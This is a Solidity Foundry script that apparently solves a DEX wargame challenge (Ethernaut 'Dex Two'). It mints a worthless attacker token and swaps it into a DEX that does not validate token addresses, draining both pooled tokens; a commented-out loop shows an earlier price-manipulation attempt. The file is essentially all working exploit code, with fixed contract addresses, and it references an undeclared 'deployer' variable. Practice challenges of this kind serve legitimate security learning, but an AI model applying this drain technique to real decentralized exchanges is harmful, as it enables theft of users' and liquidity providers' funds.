// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface ISwappableTokenTwo {
    function approve(address owner, address spender, uint256 amount) external;
    function balanceOf(address name) external returns (uint256);
}

contract AttToken is ERC20 {
    constructor() ERC20("AttToken", "ATT") {
        _mint(msg.sender, 10000000000000000000000);
    }
}

contract DexScript is Script {
    address private contractAddress;

    function run() public {
        address player = deployer;
        vm.startBroadcast(player);
        contractAddress = 0xBb78B9B57c3AD8AdA0ABE52db4B96dC4eb84cBdf;
        address token1 = 0xe3B853004dBF035D08d560b9fA75b4160470c6E2;
        address token2 = 0xfc9B31B5b22AcBf1B707A70FC37141642D0c9761;

        /* for(uint i = 0; i < 5; i++){
            console2.log(i);
            uint256 token1balance = IERC20(token1).balanceOf(player);
            uint256 token2balance = IERC20(token2).balanceOf(player);
            if(IERC20(token1).balanceOf(contractAddress) == 0 || IERC20(token1).balanceOf(contractAddress)==0){
                break;
            } else if(i%2==0){
                IDexTwo(contractAddress).swap(token1, token2, token1balance);
            } else{
                IDexTwo(contractAddress).swap(token2, token1, token2balance);
            }
        }
        IDexTwo(contractAddress).swap(token2, token1, IERC20(token2).balanceOf(contractAddress)); */

        // IERC20(token2).transferFrom(contractAddress, player, IERC20(token2).balanceOf(contractAddress));
        vm.txGasPrice(0.003 * 1e18);
        AttToken tokenAtt = AttToken(0x58cBcE13d2a3a9943BA9cC214d415A802d0bcDec);

        tokenAtt.approve(contractAddress, 1000);

        IDexTwo(contractAddress).swap(address(tokenAtt), token2, 4);

        IDexTwo(contractAddress).swap(address(tokenAtt), token1, 8);

        /* if(ISwappableTokenTwo(token1).balanceOf(contractAddress) != 0 
            || ISwappableTokenTwo(token2).balanceOf(contractAddress) != 0){
            revert();
        } */
        vm.stopBroadcast();
    }
}
